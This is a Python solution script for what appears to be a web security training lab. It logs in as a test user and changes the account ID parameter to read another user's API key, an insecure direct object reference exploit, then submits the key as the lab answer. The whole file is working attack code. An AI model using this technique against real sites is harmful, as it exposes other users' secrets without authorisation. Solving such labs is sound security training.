import requests
import re
import sys

def get_csrf_token(response_text):
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text)
    if csrf_token_match:
        return csrf_token_match.group(1)
    return None

def get_api_key(response_text):
    api_key_match = re.search(r'<div>Your API Key is: ([a-zA-Z0-9]+)</div><br/>', response_text)
    if api_key_match:
        return api_key_match.group(1)
    return None

def main(base_url, priv_url):
    session = requests.Session()

    # Step 1: GET /login to retrieve the login page
    response = session.get(base_url + '/login')
    csrf_token = get_csrf_token(response.text)

    if not csrf_token:
        print("CSRF token not found")
        sys.exit(1)

    login_data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(base_url + '/login', data=login_data)
    response = session.get(priv_url)

    API_key = get_api_key(response.text)

    print(f"API Key: {API_key}")

    burp_headers = {}
    burp_data = {"answer": API_key}
    session.post(burp_url, headers=burp_headers, data=burp_data)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    priv_url = base_url + '/my-account?id=carlos'
    burp_url = base_url + '/submitSolution'
    main(base_url, priv_url)
